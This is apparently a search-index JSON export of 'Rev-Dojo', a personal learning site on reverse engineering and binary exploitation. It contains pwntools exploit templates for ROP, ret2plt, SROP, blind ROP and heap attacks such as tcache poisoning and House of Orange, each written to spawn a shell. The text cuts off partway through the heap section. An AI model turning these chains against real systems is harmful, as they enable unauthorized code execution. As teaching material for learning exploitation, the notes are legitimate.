{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Rev-Dojo","text":"<p>Rev-Dojo is my personal journey in learning the foundations of reverse engineering and binary exploitation. This documentation serves as both my learning notes and a resource for others interested in these fields.</p>"},{"location":"#reverse-engineering","title":"Reverse Engineering","text":"<p>What is reverse engineering? </p> <p>In short: while software engineering creates applications, reverse engineering attempts to understand the flow and inner workings of these \"packaged\" programs through various analytical techniques.</p> <p>Common use cases of reverse engineering include:</p> <ul> <li>Malware analysis</li> <li>Vulnerability research</li> <li>Copy protection research</li> <li>Game hacking and modding</li> <li>Legacy system understanding</li> <li>Competitive analysis</li> </ul>"},{"location":"#binary-exploitation","title":"Binary Exploitation","text":"<p>Binary exploitation, also known as \"pwn,\" involves exploiting compiled binaries at the machine-code level to gain unauthorized access or control over systems.</p> <p>There are various types of binary formats such as:</p> <ul> <li>ELF (Executable and Linkable Format) for Linux systems</li> <li>PE (Portable Executable) for Windows systems</li> <li>Mach-O for macOS systems</li> </ul>"},{"location":"#learning-path","title":"Learning Path","text":"<p>This documentation is structured to provide a progressive learning experience, starting with foundational concepts and advancing to complex exploitation techniques. Each section builds upon previous knowledge to ensure a comprehensive understanding.</p> <p>Next: C Programming Essentials I</p>"},{"location":"binary-exploitation/advanced/01-rop/","title":"ROP (Return Oriented Programming)","text":"<p>Return Oriented Programming (ROP) is an advanced exploitation technique that chains together small instruction sequences called \"gadgets\" to bypass modern security mitigations like DEP/NX bit.</p>"},{"location":"binary-exploitation/advanced/01-rop/#introduction-to-rop","title":"Introduction to ROP","text":""},{"location":"binary-exploitation/advanced/01-rop/#what-is-rop","title":"What is ROP?","text":"<p>ROP reuses existing code in the target binary to perform arbitrary computations:</p> <ul> <li>Gadgets: Short instruction sequences ending in <code>ret</code></li> <li>Chain: Sequence of gadget addresses on the stack</li> <li>Execution: Each <code>ret</code> instruction jumps to the next gadget</li> <li>Bypass: Circumvents DEP/NX by using existing executable code</li> </ul>"},{"location":"binary-exploitation/advanced/01-rop/#why-rop-is-needed","title":"Why ROP is Needed","text":"<p>Modern protections that ROP helps bypass:</p> <pre><code>DEP/NX Bit: Prevents execution of stack/heap data\nASLR: Randomizes memory layout\nStack Canaries: Detect stack buffer overflows\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#rop-vs-traditional-exploitation","title":"ROP vs Traditional Exploitation","text":"Traditional ROP Inject shellcode Reuse existing code Execute stack data Execute .text section Blocked by DEP Bypasses DEP Simple payload Complex chain"},{"location":"binary-exploitation/advanced/01-rop/#rop-gadgets","title":"ROP Gadgets","text":""},{"location":"binary-exploitation/advanced/01-rop/#basic-gadget-types","title":"Basic Gadget Types","text":"<pre><code>; Data movement gadgets\npop rax; ret          ; Load value from stack into RAX\npop rdi; ret          ; Load first function argument\nmov [rax], rbx; ret   ; Store RBX at address in RAX\n\n; Arithmetic gadgets  \nadd rax, rbx; ret     ; Add RBX to RAX\nxor rax, rax; ret     ; Zero out RAX\ninc rax; ret          ; Increment RAX\n\n; Control flow gadgets\njmp rax               ; Jump to address in RAX\ncall rax              ; Call function at address in RAX\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#finding-gadgets","title":"Finding Gadgets","text":""},{"location":"binary-exploitation/advanced/01-rop/#using-ropgadget","title":"Using ROPgadget","text":"<pre><code># Install ROPgadget\npip install ropgadget\n\n# Find all gadgets\nROPgadget --binary ./target\n\n# Find specific gadgets\nROPgadget --binary ./target --only \"pop|ret\"\nROPgadget --binary ./target --string \"/bin/sh\"\nROPgadget --binary ./target --opcode \"syscall\"\n\n# Advanced filtering\nROPgadget --binary ./target --depth 5\nROPgadget --binary ./target --badbytes \"00|0a|0d\"\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#using-pwntools","title":"Using pwntools","text":"<pre><code>from pwn import *\n\nelf = ELF('./target')\nrop = ROP(elf)\n\n# Find specific gadgets\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\npop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]\n\n# Search for strings\nbin_sh = next(elf.search(b'/bin/sh'))\n\nprint(f\"pop rdi; ret: 0x{pop_rdi:x}\")\nprint(f\"/bin/sh: 0x{bin_sh:x}\")\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#manual-gadget-search","title":"Manual Gadget Search","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef find_gadgets_manual(binary_path):\n    with open(binary_path, 'rb') as f:\n        binary = f.read()\n\n    # Search for RET instruction (0xc3)\n    ret_gadgets = []\n\n    for i in range(len(binary)):\n        if binary[i] == 0xc3:  # RET instruction\n            # Look backwards for useful instructions\n            for j in range(1, 10):  # Check up to 10 bytes back\n                if i - j &lt; 0:\n                    break\n\n                # Check for pop rdi (0x5f)\n                if binary[i-j] == 0x5f:\n                    gadget_addr = 0x400000 + (i - j)  # Adjust base address\n                    ret_gadgets.append(('pop rdi; ret', gadget_addr))\n\n    return ret_gadgets\n\ngadgets = find_gadgets_manual('./target')\nfor name, addr in gadgets:\n    print(f\"{name}: 0x{addr:x}\")\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#basic-rop-chains","title":"Basic ROP Chains","text":""},{"location":"binary-exploitation/advanced/01-rop/#simple-function-call","title":"Simple Function Call","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./target')\n\ndef basic_rop_chain():\n    # Find gadgets\n    pop_rdi = 0x400123  # pop rdi; ret\n    system_addr = elf.plt['system']\n    bin_sh = next(elf.search(b'/bin/sh'))\n\n    # Build ROP chain\n    rop_chain = [\n        pop_rdi,      # Gadget to set RDI\n        bin_sh,       # Argument: \"/bin/sh\"\n        system_addr   # Call system()\n    ]\n\n    # Create payload\n    offset = 72\n    payload = b'A' * offset\n\n    for addr in rop_chain:\n        payload += p64(addr)\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#multi-argument-function-call","title":"Multi-argument Function Call","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef multi_arg_rop():\n    # For execve(\"/bin/sh\", NULL, NULL)\n    # Need: RDI = \"/bin/sh\", RSI = NULL, RDX = NULL\n\n    pop_rdi = 0x400123    # pop rdi; ret\n    pop_rsi_r15 = 0x400124  # pop rsi; pop r15; ret  \n    pop_rdx = 0x400125    # pop rdx; ret\n\n    rop_chain = [\n        pop_rdi,\n        bin_sh_addr,      # RDI = \"/bin/sh\"\n\n        pop_rsi_r15,\n        0x0,              # RSI = NULL\n        0x0,              # R15 = dummy value\n\n        pop_rdx,\n        0x0,              # RDX = NULL\n\n        execve_addr       # Call execve()\n    ]\n\n    return b'A' * 72 + b''.join(p64(addr) for addr in rop_chain)\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#advanced-rop-techniques","title":"Advanced ROP Techniques","text":""},{"location":"binary-exploitation/advanced/01-rop/#stack-pivoting","title":"Stack Pivoting","text":"<p>When buffer is too small for full ROP chain:</p> <pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef stack_pivot_rop():\n    # Small buffer overflow\n    # Use stack pivot to larger controlled area\n\n    xchg_eax_esp = 0x400567  # xchg eax, esp; ret\n    pop_eax = 0x400123       # pop eax; ret\n\n    # Stage 1: Pivot stack to heap/bss\n    pivot_addr = 0x601000    # Writable memory area\n\n    stage1 = [\n        pop_eax,\n        pivot_addr,\n        xchg_eax_esp  # ESP = pivot_addr\n    ]\n\n    # Stage 2: Full ROP chain at pivot location\n    stage2 = build_full_rop_chain()\n\n    # Write stage2 to pivot location first\n    write_to_memory(pivot_addr, stage2)\n\n    # Trigger overflow with stage1\n    payload = b'A' * 32 + b''.join(p64(addr) for addr in stage1)\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#rop-chain-generator","title":"ROP Chain Generator","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nclass ROPBuilder:\n    def __init__(self, binary_path):\n        self.elf = ELF(binary_path)\n        self.rop = ROP(self.elf)\n        self.chain = []\n\n    def set_register(self, reg, value):\n        \"\"\"Set register to specific value\"\"\"\n        if reg == 'rdi':\n            gadget = self.rop.find_gadget(['pop rdi', 'ret'])[0]\n        elif reg == 'rsi':\n            gadget = self.rop.find_gadget(['pop rsi', 'ret'])[0]\n        elif reg == 'rdx':\n            gadget = self.rop.find_gadget(['pop rdx', 'ret'])[0]\n        else:\n            raise ValueError(f\"Unsupported register: {reg}\")\n\n        self.chain.extend([gadget, value])\n\n    def call_function(self, func_addr):\n        \"\"\"Call function with current register state\"\"\"\n        self.chain.append(func_addr)\n\n    def write_memory(self, addr, value):\n        \"\"\"Write value to memory address\"\"\"\n        # pop rax; ret\n        pop_rax = self.rop.find_gadget(['pop rax', 'ret'])[0]\n        # pop rbx; ret  \n        pop_rbx = self.rop.find_gadget(['pop rbx', 'ret'])[0]\n        # mov [rax], rbx; ret\n        mov_gadget = self.rop.find_gadget(['mov qword ptr [rax], rbx', 'ret'])[0]\n\n        self.chain.extend([\n            pop_rax, addr,\n            pop_rbx, value,\n            mov_gadget\n        ])\n\n    def build_execve_chain(self, filename=\"/bin/sh\"):\n        \"\"\"Build execve() system call\"\"\"\n        # Find or create string\n        try:\n            str_addr = next(self.elf.search(filename.encode()))\n        except StopIteration:\n            # Need to write string to memory\n            str_addr = 0x601000  # Writable section\n            for i, char in enumerate(filename.encode() + b'\\x00'):\n                self.write_memory(str_addr + i, char)\n\n        # Set up registers for execve\n        self.set_register('rdi', str_addr)  # filename\n        self.set_register('rsi', 0)         # argv = NULL\n        self.set_register('rdx', 0)         # envp = NULL\n        self.set_register('rax', 59)        # sys_execve\n\n        # Find syscall gadget\n        syscall = self.rop.find_gadget(['syscall'])[0]\n        self.call_function(syscall)\n\n    def get_chain(self):\n        \"\"\"Return the ROP chain as bytes\"\"\"\n        return b''.join(p64(addr) for addr in self.chain)\n\n# Usage\nbuilder = ROPBuilder('./target')\nbuilder.build_execve_chain()\nrop_chain = builder.get_chain()\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#bypassing-aslr-with-rop","title":"Bypassing ASLR with ROP","text":""},{"location":"binary-exploitation/advanced/01-rop/#information-leak-rop","title":"Information Leak + ROP","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef aslr_bypass_rop():\n    p = process('./target')\n    elf = ELF('./target')\n\n    # Stage 1: Leak libc address\n    pop_rdi = 0x400743\n    puts_plt = elf.plt['puts']\n    puts_got = elf.got['puts']\n    main_addr = elf.symbols['main']\n\n    # ROP chain to leak puts address\n    leak_chain = [\n        pop_rdi,\n        puts_got,     # puts(puts@got)\n        puts_plt,\n        main_addr     # Return to main for second exploit\n    ]\n\n    payload1 = b'A' * 72 + b''.join(p64(addr) for addr in leak_chain)\n    p.sendline(payload1)\n\n    # Parse leaked address\n    leaked_puts = u64(p.recvline()[:6].ljust(8, b'\\x00'))\n    log.info(f\"Leaked puts: 0x{leaked_puts:x}\")\n\n    # Calculate libc base\n    libc = ELF('./libc.so.6')\n    libc.address = leaked_puts - libc.symbols['puts']\n    log.info(f\"Libc base: 0x{libc.address:x}\")\n\n    # Stage 2: ROP to system with known addresses\n    system_addr = libc.symbols['system']\n    bin_sh_addr = next(libc.search(b'/bin/sh'))\n\n    exploit_chain = [\n        pop_rdi,\n        bin_sh_addr,\n        system_addr\n    ]\n\n    payload2 = b'A' * 72 + b''.join(p64(addr) for addr in exploit_chain)\n    p.sendline(payload2)\n    p.interactive()\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#ret2plt-technique","title":"ret2plt Technique","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef ret2plt_exploit():\n    \"\"\"Use PLT entries to call libc functions\"\"\"\n    elf = ELF('./target')\n\n    # Use PLT entries (no ASLR on main binary)\n    puts_plt = elf.plt['puts']\n    read_plt = elf.plt['read'] \n\n    # Gadgets from main binary (no ASLR)\n    pop_rdi = 0x400743\n    pop_rsi_r15 = 0x400741\n    pop_rdx = 0x400749\n\n    # Writable memory in BSS\n    bss_addr = elf.bss()\n\n    # Chain: read(\"/bin/sh\\x00\", bss, 8) then system(bss)\n    chain = [\n        # read(0, bss, 8)\n        pop_rdi, 0,           # stdin\n        pop_rsi_r15, bss_addr, 0,  # buffer, dummy\n        pop_rdx, 8,           # count\n        read_plt,\n\n        # system(bss)\n        pop_rdi, bss_addr,\n        elf.plt['system']\n    ]\n\n    payload = b'A' * 72 + b''.join(p64(addr) for addr in chain)\n\n    p = process('./target')\n    p.sendline(payload)\n    p.sendline(b'/bin/sh\\x00')  # Input for read()\n    p.interactive()\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#srop-sigreturn-oriented-programming","title":"SROP (Sigreturn-oriented Programming)","text":""},{"location":"binary-exploitation/advanced/01-rop/#sigreturn-system-call","title":"Sigreturn System Call","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef srop_exploit():\n    \"\"\"Use sigreturn to control all registers\"\"\"\n    context.arch = 'amd64'\n\n    # Find syscall gadget\n    syscall_gadget = 0x400517  # syscall; ret\n\n    # Create sigreturn frame\n    frame = SigreturnFrame()\n    frame.rax = 59          # sys_execve\n    frame.rdi = 0x601000    # \"/bin/sh\" address\n    frame.rsi = 0           # NULL\n    frame.rdx = 0           # NULL\n    frame.rip = syscall_gadget\n\n    # ROP chain\n    chain = [\n        # Set RAX to 15 (sys_rt_sigreturn)\n        pop_rax_gadget,\n        15,\n        syscall_gadget,     # sigreturn\n        # Sigreturn frame follows\n    ]\n\n    payload = b'A' * 72\n    payload += b''.join(p64(addr) for addr in chain)\n    payload += bytes(frame)\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#32-bit-rop-differences","title":"32-bit ROP Differences","text":""},{"location":"binary-exploitation/advanced/01-rop/#calling-convention-differences","title":"Calling Convention Differences","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef rop_32bit():\n    \"\"\"32-bit ROP uses stack for function arguments\"\"\"\n    context.arch = 'i386'\n\n    # 32-bit: arguments passed on stack\n    # system(arg1) becomes:\n    # [system_addr][return_addr][arg1]\n\n    system_plt = 0x08048400\n    bin_sh = 0x08049000\n    exit_addr = 0x08048410\n\n    chain = [\n        system_plt,\n        exit_addr,    # Return address from system\n        bin_sh        # Argument to system\n    ]\n\n    payload = b'A' * 76 + b''.join(p32(addr) for addr in chain)\n    return payload\n\ndef rop_32bit_multiple_args():\n    \"\"\"Multiple arguments in 32-bit\"\"\"\n    # execve(filename, argv, envp)\n    execve_addr = 0x08048500\n    filename = 0x08049000\n\n    chain = [\n        execve_addr,\n        0x41414141,   # Return address (dummy)\n        filename,     # arg1: filename\n        0x0,          # arg2: argv = NULL  \n        0x0           # arg3: envp = NULL\n    ]\n\n    payload = b'A' * 76 + b''.join(p32(addr) for addr in chain)\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#rop-chain-automation","title":"ROP Chain Automation","text":""},{"location":"binary-exploitation/advanced/01-rop/#using-pwntools-rop-class","title":"Using pwntools ROP class","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef automated_rop():\n    context.arch = 'amd64'\n    elf = ELF('./target')\n    rop = ROP(elf)\n\n    # Automatic ROP chain generation\n    rop.call('puts', [elf.got['puts']])\n    rop.call('main', [])\n\n    print(rop.dump())\n\n    # Get the chain\n    payload = b'A' * 72 + rop.chain()\n\n    return payload\n\ndef complex_automated_rop():\n    \"\"\"More complex automated ROP\"\"\"\n    elf = ELF('./target')\n    libc = ELF('./libc.so.6')\n    rop = ROP([elf, libc])\n\n    # Build complex chain\n    rop.read(0, elf.bss(), 8)      # Read input\n    rop.system(elf.bss())          # Execute input\n\n    print(rop.dump())\n    return rop.chain()\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#rop-debugging-and-testing","title":"ROP Debugging and Testing","text":""},{"location":"binary-exploitation/advanced/01-rop/#debugging-rop-chains","title":"Debugging ROP Chains","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef debug_rop_chain():\n    context.terminal = ['tmux', 'splitw', '-h']\n\n    # Start with GDB\n    p = gdb.debug('./target', '''\n        set disassembly-flavor intel\n        break *0x400743\n        continue\n    ''')\n\n    # Build and send ROP chain\n    chain = build_rop_chain()\n    payload = b'A' * 72 + chain\n\n    p.sendline(payload)\n    p.interactive()\n\ndef validate_gadgets():\n    \"\"\"Verify gadgets work as expected\"\"\"\n    elf = ELF('./target')\n\n    # Test each gadget individually\n    gadgets = [\n        (0x400743, \"pop rdi; ret\"),\n        (0x400741, \"pop rsi; pop r15; ret\"),\n        (0x400517, \"syscall; ret\")\n    ]\n\n    for addr, desc in gadgets:\n        print(f\"Testing {desc} at 0x{addr:x}\")\n\n        # Disassemble to verify\n        code = elf.read(addr, 10)\n        disasm = disasm(code, arch='amd64')\n        print(disasm)\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#rop-chain-visualization","title":"ROP Chain Visualization","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef visualize_rop_chain(chain_data):\n    \"\"\"Visualize ROP chain structure\"\"\"\n    print(\"ROP Chain Visualization:\")\n    print(\"=\" * 50)\n\n    offset = 0\n    for i in range(0, len(chain_data), 8):\n        addr = u64(chain_data[i:i+8])\n        print(f\"Stack[{offset:2d}]: 0x{addr:016x}\")\n\n        # Try to identify what this address points to\n        try:\n            elf = ELF('./target')\n            if addr in elf.symbols.values():\n                for name, sym_addr in elf.symbols.items():\n                    if sym_addr == addr:\n                        print(f\"           ^ {name}\")\n                        break\n        except:\n            pass\n\n        offset += 8\n\ndef test_rop_step_by_step():\n    \"\"\"Test ROP chain one gadget at a time\"\"\"\n    base_payload = b'A' * 72\n\n    # Test each step\n    steps = [\n        (pop_rdi, \"pop rdi; ret\"),\n        (bin_sh_addr, \"/bin/sh string\"),\n        (system_addr, \"system() call\")\n    ]\n\n    for i, (addr, desc) in enumerate(steps):\n        print(f\"Testing step {i+1}: {desc}\")\n\n        partial_chain = b''.join(p64(a) for a, _ in steps[:i+2])\n        payload = base_payload + partial_chain\n\n        # Test with timeout\n        try:\n            p = process('./target', timeout=2)\n            p.sendline(payload)\n            output = p.recvall()\n            print(f\"  Result: {output[:50]}...\")\n        except:\n            print(f\"  Step {i+1} failed or timed out\")\n        finally:\n            if 'p' in locals():\n                p.close()\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#advanced-rop-mitigation-bypasses","title":"Advanced ROP Mitigation Bypasses","text":""},{"location":"binary-exploitation/advanced/01-rop/#jop-jump-oriented-programming","title":"JOP (Jump-oriented Programming)","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef jop_chain():\n    \"\"\"Use JMP/CALL gadgets instead of RET\"\"\"\n\n    # JOP uses indirect jumps/calls\n    # Gadgets end with jmp [reg] or call [reg]\n\n    jmp_rax = 0x400123    # jmp rax\n    pop_rax = 0x400124    # pop rax; ret\n\n    # JOP dispatcher - cycles through gadgets\n    dispatcher = jmp_rax\n\n    # Virtual registers on stack/memory\n    virtual_regs = {\n        'vrax': 0x601000,\n        'vrbx': 0x601008,\n        'vrcx': 0x601010\n    }\n\n    # JOP chain uses memory-based execution\n    # More complex than ROP but can bypass some mitigations\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#blind-rop-brop","title":"Blind ROP (BROP)","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef blind_rop_discovery():\n    \"\"\"Discover gadgets without access to binary\"\"\"\n\n    def test_crash(payload):\n        \"\"\"Test if payload causes crash\"\"\"\n        try:\n            p = remote('target.com', 1337)\n            p.sendline(payload)\n            response = p.recvall(timeout=2)\n            p.close()\n            return b\"error\" not in response.lower()\n        except:\n            return False\n\n    # Find buffer overflow offset\n    offset = 0\n    for i in range(100, 200):\n        if not test_crash(b'A' * i):\n            offset = i\n            break\n\n    print(f\"Crash offset: {offset}\")\n\n    # Find stop gadgets (prevent crash)\n    stop_gadgets = []\n    for addr in range(0x400000, 0x401000, 0x10):\n        payload = b'A' * offset + p64(addr) * 10\n        if test_crash(payload):\n            stop_gadgets.append(addr)\n            print(f\"Stop gadget found: 0x{addr:x}\")\n\n    # Find useful gadgets using stop gadgets\n    return stop_gadgets\n</code></pre>"},{"location":"binary-exploitation/advanced/01-rop/#key-takeaways","title":"Key Takeaways","text":"<p>ROP Fundamentals</p> <ul> <li>Gadgets are code reuse - Short sequences ending in RET</li> <li>Chain execution - Each RET jumps to next gadget address</li> <li>DEP bypass - Uses existing executable code</li> <li>ASLR challenges - Need information leaks for dynamic libraries</li> <li>Architecture matters - x86 vs x64 have different calling conventions</li> </ul> <p>ROP Development Process</p> <ul> <li>Start with simple function calls (system, execve)</li> <li>Use automated tools (ROPgadget, pwntools) for gadget discovery</li> <li>Test gadgets individually before building full chains</li> <li>Handle ASLR with information leaks or ret2plt</li> <li>Debug chains step-by-step when they fail</li> </ul> <p>Common ROP Pitfalls</p> <ul> <li>Misaligned stack causing crashes</li> <li>Incorrect calling conventions for target architecture  </li> <li>Forgetting about stack canaries in ROP chain location</li> <li>ASLR breaking hardcoded addresses</li> <li>Gadgets that modify unexpected registers</li> </ul> <p>Next: Heap Exploitation</p>"},{"location":"binary-exploitation/advanced/02-heap/","title":"Heap Exploitation","text":"<p>Heap exploitation targets dynamic memory allocation mechanisms to achieve arbitrary code execution. Unlike stack-based vulnerabilities, heap exploitation involves manipulating heap metadata and allocation algorithms.</p>"},{"location":"binary-exploitation/advanced/02-heap/#understanding-the-heap","title":"Understanding the Heap","text":"<p>The heap is a memory region used for dynamic memory allocation through functions like <code>malloc()</code>, <code>calloc()</code>, <code>realloc()</code>, and <code>free()</code>.</p>"},{"location":"binary-exploitation/advanced/02-heap/#heap-allocators","title":"Heap Allocators","text":"<p>glibc malloc (ptmalloc2) <pre><code>// Basic heap operations\nvoid *ptr = malloc(64);    // Allocate 64 bytes\nfree(ptr);                 // Free the memory\nptr = NULL;                // Prevent use-after-free\n</code></pre></p> <p>Key Data Structures: - Chunks: Basic allocation units containing metadata and user data - Bins: Lists organizing free chunks by size - Arena: Memory region containing heap chunks</p>"},{"location":"binary-exploitation/advanced/02-heap/#chunk-structure","title":"Chunk Structure","text":"<pre><code>struct malloc_chunk {\n    size_t prev_size;      // Size of previous chunk if free\n    size_t size;           // Size of this chunk + flags\n    struct malloc_chunk *fd;   // Forward pointer (free chunks)\n    struct malloc_chunk *bk;   // Backward pointer (free chunks)\n    // User data follows...\n};\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#common-heap-vulnerabilities","title":"Common Heap Vulnerabilities","text":""},{"location":"binary-exploitation/advanced/02-heap/#use-after-free-uaf","title":"Use-After-Free (UAF)","text":"<p>Accessing memory after it has been freed can lead to arbitrary code execution.</p> <pre><code>// Vulnerable code\nchar *buffer = malloc(64);\nstrcpy(buffer, user_input);\nfree(buffer);\n// buffer is freed but pointer still exists\n\n// Later in code...\nprintf(\"Data: %s\\n\", buffer);  // Use-after-free!\n</code></pre> <p>Exploitation Steps: 1. Free a chunk containing function pointers 2. Allocate new chunk with controlled data 3. Trigger use of freed chunk to execute controlled data</p>"},{"location":"binary-exploitation/advanced/02-heap/#double-free","title":"Double Free","text":"<p>Freeing the same chunk twice corrupts heap metadata.</p> <pre><code>// Vulnerable code\nfree(ptr);\n// ... some code ...\nfree(ptr);  // Double free vulnerability!\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#heap-buffer-overflow","title":"Heap Buffer Overflow","text":"<p>Overflowing heap buffers can corrupt adjacent chunk metadata.</p> <pre><code>// Vulnerable code\nchar *buf1 = malloc(64);\nchar *buf2 = malloc(64);\nstrcpy(buf1, very_long_string);  // Overflows into buf2's metadata\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"binary-exploitation/advanced/02-heap/#fastbin-attack","title":"Fastbin Attack","text":"<p>Exploits the fastbin mechanism for small chunk allocations.</p> <pre><code># pwntools exploitation example\nfrom pwn import *\n\n# 1. Allocate chunks in fastbin range (&lt; 128 bytes)\nmalloc(0, 64)  # chunk A\nmalloc(1, 64)  # chunk B\n\n# 2. Free chunks to populate fastbin\nfree(0)  # A -&gt; fastbin\nfree(1)  # B -&gt; A -&gt; fastbin\n\n# 3. Double free to corrupt fastbin\nfree(0)  # A -&gt; B -&gt; A (corrupted fastbin)\n\n# 4. Allocate with fake chunk address\nfake_chunk = target_address - 8  # Account for chunk header\nmalloc(2, 64, fake_chunk)  # Points fastbin to fake chunk\n\n# 5. Allocate to get arbitrary write\nmalloc(3, 64)  # Returns address near target\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#tcache-poisoning-glibc-226","title":"Tcache Poisoning (glibc &gt;= 2.26)","text":"<p>Tcache (thread local cache) provides per-thread chunk caching.</p> <pre><code># Tcache poisoning example\ndef tcache_poison():\n    # 1. Fill tcache for specific size\n    chunks = []\n    for i in range(7):  # Tcache holds max 7 chunks\n        chunks.append(malloc(64))\n\n    for chunk in chunks:\n        free(chunk)\n\n    # 2. Free one more to bypass tcache\n    victim = malloc(64)\n    free(victim)\n\n    # 3. Create fake chunk\n    fake_chunk = target_address\n\n    # 4. Overwrite tcache entry\n    edit(victim, p64(fake_chunk))\n\n    # 5. Allocate to get arbitrary address\n    malloc(64)  # Normal allocation\n    evil_chunk = malloc(64)  # Returns fake_chunk address\n\n    return evil_chunk\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#house-of-spirit","title":"House of Spirit","text":"<p>Creates a fake chunk in a controlled memory region.</p> <pre><code>def house_of_spirit():\n    # 1. Create fake chunk on stack or in data section\n    fake_chunk = b\"\"\n    fake_chunk += p64(0)        # prev_size (unused)\n    fake_chunk += p64(0x71)     # size (must be valid)\n    fake_chunk += b\"A\" * 0x60   # fake data\n    fake_chunk += p64(0x70)     # next chunk's prev_size\n\n    # 2. Get pointer to fake chunk\n    fake_ptr = stack_address + 8  # Skip prev_size\n\n    # 3. Free the fake chunk\n    free_function(fake_ptr)\n\n    # 4. Allocate to get fake chunk back\n    controlled_chunk = malloc(0x68)\n\n    return controlled_chunk\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#unsorted-bin-attack","title":"Unsorted Bin Attack","text":"<p>Exploits the unsorted bin to achieve arbitrary write.</p> <pre><code>def unsorted_bin_attack():\n    # 1. Allocate large chunk (&gt; fastbin size)\n    chunk_a = malloc(0x100)\n\n    # 2. Allocate another chunk to prevent consolidation\n    guard = malloc(0x100)\n\n    # 3. Free chunk A (goes to unsorted bin)\n    free(chunk_a)\n\n    # 4. Overwrite chunk A's bk pointer\n    target = target_address - 0x10  # Account for unsorted bin structure\n    edit(chunk_a + 8, p64(main_arena + 88) + p64(target))\n\n    # 5. Allocate to trigger unsorted bin removal\n    malloc(0x100)  # Writes main_arena address to target\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#advanced-heap-techniques","title":"Advanced Heap Techniques","text":""},{"location":"binary-exploitation/advanced/02-heap/#house-of-orange","title":"House of Orange","text":"<p>Exploits <code>_IO_FILE</code> structures when no <code>free()</code> function is available.</p> <pre><code>def house_of_orange():\n    # 1. Overflow top chunk size\n    overflow_top_chunk_size(0x1)\n\n    # 2. Trigger malloc_printerr through _IO_flush_all_lockp\n    large_malloc = malloc(0x1000)\n\n    # 3. Craft fake _IO_FILE structure\n    fake_file = craft_io_file_structure()\n\n    # 4. Overwrite stderr pointer\n    overwrite_stderr(fake_file)\n\n    # 5. Trigger error to execute crafted vtable\n    trigger_error()\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#fsop-file-stream-oriented-programming","title":"FSOP (File Stream Oriented Programming)","text":"<p>Exploits <code>_IO_FILE</code> structures for code execution.</p> <pre><code>def fsop_exploit():\n    # 1. Leak libc addresses\n    libc_base = leak_libc()\n    system_addr = libc_base + system_offset\n\n    # 2. Craft fake _IO_FILE\n    fake_file = b\"\"\n    fake_file += p64(0)  # _flags\n    fake_file += p64(0)  # _IO_read_ptr\n    # ... craft complete structure\n\n    # 3. Overwrite _IO_list_all or stderr\n    overwrite_io_structure(fake_file)\n\n    # 4. Trigger through malloc_printerr or exit\n    trigger_fsop()\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#heap-debugging-tools","title":"Heap Debugging Tools","text":""},{"location":"binary-exploitation/advanced/02-heap/#gdb-with-pwndbgpeda","title":"GDB with pwndbg/peda","text":"<pre><code># Heap analysis commands\n(gdb) heap\n(gdb) bins\n(gdb) tcache\n(gdb) fastbins\n(gdb) unsorted_bin\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#heap-visualization","title":"Heap Visualization","text":"<pre><code># pwntools heap debugging\ndef debug_heap():\n    gdb.attach(p, \"\"\"\n        set environment LD_PRELOAD=./libc.so.6\n        b malloc\n        b free\n        c\n    \"\"\")\n</code></pre>"},{"location":"binary-exploitation/advanced/02-heap/#mitigation-bypasses","title":"Mitigation Bypasses","text":""},{"location":"binary-exploitation/advanced/02-heap/#aslr-bypass","title":"ASLR Bypass","text":"<ul> <li>Heap spraying</li> <li>Information leaks</li> <li>Relative overwrites</li> </ul>"},{"location":"binary-exploitation/advanced/02-heap/#heap-protection-bypass","title":"Heap Protection Bypass","text":"<ul> <li>Double free detection bypass</li> <li>Metadata corruption</li> <li>Tcache key validation bypass</li> </ul>"},{"location":"binary-exploitation/advanced/02-heap/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Understand heap internals: Know how your target allocator works</li> 